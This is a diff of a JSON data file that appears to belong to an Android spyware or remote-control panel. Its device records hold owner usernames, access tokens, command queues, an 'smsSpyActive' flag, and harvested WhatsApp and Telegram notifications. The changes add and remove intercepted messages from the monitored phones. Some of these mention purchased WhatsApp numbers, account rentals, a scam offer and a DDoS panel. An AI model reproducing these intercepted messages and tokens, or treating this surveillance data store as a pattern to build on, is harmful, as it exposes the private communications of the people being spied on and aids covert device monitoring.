@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776778595951,
+    "lastSeen": 1776778598955,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776778596425,
+    "lastSeen": 1776778599207,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 20:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778601034
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 20:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778599038
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 20:36",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778597887
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:36",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778597872
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:36",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778597853
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:36",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778597838
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -14354,54 +14402,6 @@
         "time": "21/04 20:26",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776778013637
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: WhatsApp\n• Negara: Indonesia 🇮🇩\n• Server: Server (1)\n• Nomor: +6283*******26\n• Waktu: 21/04/2026, 20.23",
-        "time": "21/04 20:26",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778013521
-      },
-      {
-        "appName": "Telegram",
-        "sender": "SEWA WA BY LIFESTYLE😈: Rose",
-        "content": "Hey there KING777, and welcome to SEWA WA BY LIFESTYLE😈! How are you?",
-        "time": "21/04 20:26",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778013499
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16814 pesan baru dari 118 obrolan",
-        "time": "21/04 20:26",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778003269
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: WhatsApp\n• Negara: Indonesia 🇮🇩\n• Server: Server (1)\n• Nomor: +6283*******26\n• Waktu: 21/04/2026, 20.23",
-        "time": "21/04 20:26",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778003139
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Hàblàr sobrè la muèrte",
-        "content": "Fs Noktel \nId 1 r9k nomin \nId 1 malay scam r? Dm\n@j4Xxzw",
-        "time": "21/04 20:26",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778003109
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PUBLIC FREE PANEL: Rose",
-        "content": "DDOS PANEL GW SUMPAHIN YAPIT",
-        "time": "21/04 20:26",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778003088
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776778596284,
+    "lastSeen": 1776778599327,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
